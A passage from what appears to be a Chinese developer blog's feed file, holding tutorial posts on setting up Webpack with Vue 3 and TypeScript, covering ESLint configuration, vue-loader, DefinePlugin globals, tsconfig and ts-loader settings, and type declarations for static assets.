class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">extends</span>: [</span><br><span class="line">    <span class="string">&#x27;../../.eslintrc.cjs&#x27;</span>,</span><br><span class="line">    <span class="comment">// 使用 eslint 推荐规则集</span></span><br><span class="line">    <span class="string">&#x27;eslint:recommended&#x27;</span>,</span><br><span class="line">    <span class="comment">// 使用 typescript eslint 配置和推荐规则集</span></span><br><span class="line">    <span class="string">&#x27;plugin:@typescript-eslint/recommended&#x27;</span>,</span><br><span class="line">    <span class="comment">// 使用 vue3 配置和推推荐规则集</span></span><br><span class="line">    <span class="string">&#x27;plugin:vue/vue3-recommended&#x27;</span>,</span><br><span class="line">    <span class="comment">// 替代 eslint-plugin-prettier，支持 vue 文件中的 prettier 的校验</span></span><br><span class="line">    <span class="string">&#x27;plugin:prettier-vue/recommended&#x27;</span>,</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">parserOptions</span>: &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在使用了 eslint-plugin-vue 后 parser 选项就会被修改为 vue 的 parser 导致无法解析 ts 文件</span></span><br><span class="line"><span class="comment">     * 为了不影响 ts 文件的解析，需要在此指定一个自定义的解析器来解析 ts 文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="attr">parser</span>: <span class="string">&#x27;@typescript-eslint/parser&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">rules</span>: &#123;</span><br><span class="line">    <span class="comment">// 自定义规则集</span></span><br><span class="line">    <span class="string">&#x27;@typescript-eslint/no-var-requires&#x27;</span>: <span class="string">&#x27;off&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;@typescript-eslint/no-explicit-any&#x27;</span>: <span class="string">&#x27;off&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vue/multi-word-component-names&#x27;</span>: <span class="string">&#x27;off&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>如果 extends 的配置太多，搞不清最终的配置长啥样，可以使用 <code>pnpm exec eslint --print-config .eslintrc.cjs</code> 可以查看最终的 eslint 配置。</p></blockquote><h2 id="准备-Vue-环境"><a href="#准备-Vue-环境" class="headerlink" title="准备 Vue 环境"></a>准备 Vue 环境</h2><p>安装 vue 相关的依赖：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pnpm install vue -S</span><br><span class="line">pnpm install vue-loader vue-style-loader vue-template-compiler -D</span><br></pre></td></tr></table></figure><ul><li>vue：Vue 核心库</li><li>vue-loader：Vue 的 webpack loader</li><li>vue-style-loader：Vue 的样式 loader，替代 style-loader，该 loader 是 style-loader 的代码库 fork，添加了对 scoped 样式与 SSR 相关的支持</li><li>vue-template-compiler：Vue 模板编译器，会被 vue-loader 调用，需要独立安装</li></ul><p>修改 <code>main.ts</code> 引入一个 Vue 组件：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@/styles/global.css&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>);</span><br></pre></td></tr></table></figure><p>修改 <code>public/index.html</code>，为 body 下插入 <code>#app</code> 节点：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;vue template&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line"><span class="addition">+   &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;</span></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="使-Webpack-支持编译-Vue"><a href="#使-Webpack-支持编译-Vue" class="headerlink" title="使 Webpack 支持编译 Vue"></a>使 Webpack 支持编译 Vue</h2><p>修改 <code>webpack.config.ts</code>，添加对 Vue 的支持：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VueLoaderPlugin</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-loader&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">DefinePlugin</span>, <span class="title class_">Configuration</span> <span class="keyword">as</span> <span class="title class_">WebpackConfiguration</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;webpack&#x27;</span>;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">config</span>: <span class="title class_">WebpackConfiguration</span> = &#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      <span class="comment">// 处理 Vue</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.vue$/</span>,</span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>,</span><br><span class="line">        <span class="attr">use</span>: [<span class="string">&#x27;vue-loader&#x27;</span>],</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 处理 ts</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.tsx?$/</span>,</span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">loader</span>: <span class="string">&#x27;ts-loader&#x27;</span>,</span><br><span class="line">            <span class="attr">options</span>: &#123;</span><br><span class="line">              <span class="comment">// 需要让 ts-loader 识别 vue SFC 中的 ts 代码</span></span><br><span class="line">              <span class="attr">appendTsSuffixTo</span>: [<span class="string">&#x27;\\.vue$&#x27;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 加载样式</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/i</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          <span class="comment">// 使用 vue-style-loader 替换掉 style-loader</span></span><br><span class="line">          isDev ? <span class="string">&#x27;vue-style-loader&#x27;</span> : <span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;postcss-loader&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// ... ... 其他的 Loader</span></span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">VueLoaderPlugin</span>(),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用 webpack 自带的 DefinePlugin 定义全局变量</span></span><br><span class="line"><span class="comment">     * __VUE_OPTIONS_API__、__VUE_PROD_DEVTOOLS__ 为 true 时候可以使用 Chrome 的 Vue Devtools 插件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">DefinePlugin</span>(&#123;</span><br><span class="line">      <span class="attr">__VUE_OPTIONS_API__</span>: isDev,</span><br><span class="line">      <span class="attr">__VUE_PROD_DEVTOOLS__</span>: isDev,</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>关于 DefinePlugin 再多讲一点，这个插件是用于定义全局变量的，我们可以直接在代码中使用 <code>console.log(__VUE_OPTIONS_API__)</code> 来查看它的值（它并非挂载于 window 上，而是全局对象上）。但是如果你想要定义更多的全局变量，为了让 ts 和 eslint 不报错，你需要进行一系列的设置。</p><p>假如我们定义了全局变量：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">DefinePlugin</span>(&#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  <span class="attr">IS_DEV</span>: isDev,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>我们需要在全局声明该变量的类型，可以在 <code>types</code> 目录下新建 <code>global.d.ts</code>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="keyword">const</span> <span class="attr">IS_DEV</span>: <span class="built_in">boolean</span>;</span><br></pre></td></tr></table></figure><p>这样 ts 就不会报错了，但是如果我们使用了 eslint，它会报 <code>no-undef</code> 的错误，我们需要在 <code>.eslintrc.cjs</code> 中添加 <code>globals</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  <span class="attr">globals</span>: &#123;</span><br><span class="line">    <span class="attr">IS_DEV</span>: <span class="string">&#x27;readonly&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此外，为了不让 ts 引入 Vue 组件时报没有类型定义的错误，我们需要在 <code>types</code> 目录下新建 <code>vue-shim.d.ts</code>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* eslint-disable @typescript-eslint/ban-types */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&#x27;*.vue&#x27;</span> &#123;</span><br><span class="line">  <span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">DefineComponent</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="attr">component</span>: <span class="title class_">DefineComponent</span>&lt;&#123;&#125;, &#123;&#125;, <span class="built_in">any</span>&gt;;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> component;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，我们要调整以下 browserslist 的配置，之前的配置我们考虑到了 IE 浏览器，但是 Vue3 不支持 IE 浏览器，因此我们可以调整浏览器适配的范围，这样可以减少一些 polyfill 的代码。修改 <code>.browserlistrc</code> 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; 0.2% and not dead</span><br></pre></td></tr></table></figure><p>表示适配市场份额大于 0.2% 的浏览器，不包括已经停止维护的浏览器。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webpack 操练场 ②：使用 Webpack 构建 TypeScript 开发环境</title>
      <link href="/2023/12/cf01b787d4b4.html"/>
      <url>/2023/12/cf01b787d4b4.html</url>
      
        <content type="html"><![CDATA[<h1 id="使用-Webpack-构建-TypeScript-开发环境"><a href="#使用-Webpack-构建-TypeScript-开发环境" class="headerlink" title="使用 Webpack 构建 TypeScript 开发环境"></a>使用 Webpack 构建 TypeScript 开发环境</h1><p>对应代码：<a href="https://github.com/EsunR/webpack-playground/tree/main/templates/html-ts">https://github.com/EsunR/webpack-playground/tree/main/templates/html-ts</a></p><h2 id="准备-TypeScript-环境"><a href="#准备-TypeScript-环境" class="headerlink" title="准备 TypeScript 环境"></a>准备 TypeScript 环境</h2><p>首先安装 TypeScript：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install typescript -D</span><br></pre></td></tr></table></figure><p>然后生成 tsconfig.json 配置文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pnpm <span class="built_in">exec</span> tsc --init</span><br><span class="line"></span><br><span class="line"><span class="comment"># npm</span></span><br><span class="line">npx tsc --init</span><br></pre></td></tr></table></figure><p>这时候根目录就会生成 <code>tsconfig.json</code> 文件，这个文件是 TypeScript 的配置文件，我们可以在这个文件中配置 TypeScript 的编译选项，我们调整如下几个选项：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ES5&quot;</span><span class="punctuation">,</span> <span class="comment">// 将代码转为 ES5 语法</span></span><br><span class="line">    <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CommonJS&quot;</span><span class="punctuation">,</span> <span class="comment">// 使用 CommonJS 规范</span></span><br><span class="line">    <span class="attr">&quot;moduleResolution&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node10&quot;</span><span class="punctuation">,</span> <span class="comment">// 模块解析方式，不配置在引用模块时如果不是完整路径会报错</span></span><br><span class="line">    <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@/*&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;src/*&quot;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="comment">// 配置路径别名，主要让 vscode 识别，跟 webpack.config.js 中的 alias 保持对应</span></span><br><span class="line">    <span class="attr">&quot;allowJs&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span> <span class="comment">// 允许编译 js 文件</span></span><br><span class="line">    <span class="attr">&quot;outDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./dist&quot;</span> <span class="comment">// 编译产出，我们使用 webpack 不会根据这里的配置走，但是如果不配置 tsconfig 会报错</span></span><br><span class="line">    <span class="comment">// 其余配置保持默认不改动</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>之后我们将 <code>webpack.config.js</code> 修改为 <code>webpack.config.ts</code>，并将代码规范修改为 ESM，这样就可以编写有 TypeScript 提示的 webpack 配置了：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"><span class="comment">// 引入 webpack 的类型</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">Configuration</span> <span class="keyword">as</span> <span class="title class_">WebpackConfiguration</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;webpack&#x27;</span>;</span><br><span class="line"><span class="comment">// 保证配置 devServer 时不会报类型错误</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;webpack-dev-server&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isDev = process.<span class="property">env</span>.<span class="property">NODE_ENV</span> !== <span class="string">&#x27;production&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过 TypeScript 我们可以添加类型声明</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">config</span>: <span class="title class_">WebpackConfiguration</span> = &#123;</span><br><span class="line">  <span class="attr">mode</span>: isDev ? <span class="string">&#x27;development&#x27;</span> : <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">  <span class="attr">devtool</span>: isDev ? <span class="string">&#x27;eval-cheap-module-source-map&#x27;</span> : <span class="string">&#x27;source-map&#x27;</span>,</span><br><span class="line">  <span class="attr">entry</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./src/main.ts&#x27;</span>),</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./dist&#x27;</span>),</span><br><span class="line">    <span class="attr">clean</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 其他 webpack 配置</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> config;</span><br></pre></td></tr></table></figure><p>然后修改启动脚本：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line"><span class="deletion">-   &quot;dev&quot;: &quot;cross-env NODE_ENV=development webpack serve --config webpack.config.js&quot;,</span></span><br><span class="line"><span class="addition">+   &quot;dev&quot;: &quot;cross-env NODE_ENV=development webpack serve --config webpack.config.ts&quot;,</span></span><br><span class="line"><span class="deletion">-   &quot;build&quot;: &quot;cross-env NODE_ENV=production webpack --config webpack.config.js&quot;</span></span><br><span class="line"><span class="addition">+   &quot;build&quot;: &quot;cross-env NODE_ENV=production webpack --config webpack.config.ts&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行构建指令后会报错，这是因为我们只安装了 typescript 环境，但是如果想让 webpack 执行 TypeScript 的配置文件还需要 TypeScript 的运行执行指令，因此我们需要安装 <a href="https://www.npmjs.com/package/ts-node">ts-node</a>，ts-node 可以让我们在直接运行 ts 代码而不需要编译成 js：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install ts-node -D</span><br></pre></td></tr></table></figure><p>之后，webpack 就可以成功执行 TypeScript 编写的 webpack 配置文件了。</p><h2 id="添加-ts-loader"><a href="#添加-ts-loader" class="headerlink" title="添加 ts-loader"></a>添加 ts-loader</h2><p>准备完环境后，我们将 js 代码修改为 ts 代码后，webpack 会报错，这是因为 webpack 默认只能处理 js 代码，如果要处理 ts 代码，需要添加对应的 loader，这里我们使用 <a href="https://www.npmjs.com/package/ts-loader">ts-loader</a> 来处理 ts 代码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install ts-loader -D</span><br></pre></td></tr></table></figure><p>向 <code>webpack.config.ts</code> 中添加对应的 loader，同时要让 webpack 支持 ts 模块的解析:</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">config</span>: <span class="title class_">WebpackConfiguration</span> = &#123;</span><br><span class="line">  <span class="comment">// ... 其他配置</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      <span class="comment">// ... 其他 loader ...</span></span><br><span class="line">      <span class="comment">// 处理 ts 文件</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.tsx?$/i</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">loader</span>: <span class="string">&#x27;ts-loader&#x27;</span>,</span><br><span class="line">            <span class="attr">options</span>: &#123;</span><br><span class="line">              <span class="comment">// 指定特 tsconfig 的位置，也可以不指定，默认使用项目根目录的 tsconfig.json</span></span><br><span class="line">              <span class="attr">configFile</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./tsconfig.json&#x27;</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="attr">alias</span>: &#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 将 .ts (如果有需要也要加入 .tsx) 文件添加到解析列表中，否则在 import ts 模块时，如果不带文件后缀就会报错</span></span><br><span class="line">    <span class="attr">extensions</span>: [<span class="string">&#x27;.js&#x27;</span>, <span class="string">&#x27;.ts&#x27;</span>, <span class="string">&#x27;.tsx&#x27;</span>],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>除了 ts—loader，因为项目中使用了 babel，还可以使用 <a href="https://www.npmjs.com/package/babel-loader">babel-loader</a> 结合 <a href="https://www.npmjs.com/package/@babel/preset-typescript">@babel/preset-typescript</a> 来处理 ts，但是这样不支持类型检查，这里不再做演示。</p><p>另外，如果追求编译速度，可以使用 esbuild 或者使用 swc 替换 babel。</p></blockquote><h2 id="处理静态资源模块"><a href="#处理静态资源模块" class="headerlink" title="处理静态资源模块"></a>处理静态资源模块</h2><p>当引用静态资源时，ts 会报类型错误。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202312061838999.png" alt=""></p><p>这是因为 ts 无法识别我们导入的静态资源模块，通过编写类型声明文件可以解决这个问题。在 <code>src</code> 目录下创建 <code>types</code> 文件夹，并新建 <code>static.d.ts</code> 文件：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&#x27;*.css&#x27;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">classes</span>: &#123; <span class="keyword">readonly</span> [<span class="attr">key</span>: <span class="built_in">string</span>]: <span class="built_in">string</span> &#125;;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> classes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&#x27;*.png&#x27;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&#x27;*.jpg&#x27;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&#x27;*.jpeg&#x27;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&#x27;*.gif&#x27;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&#x27;*.svg&#x27;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&#x27;*.webp&#x27;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> url;</span><br><span 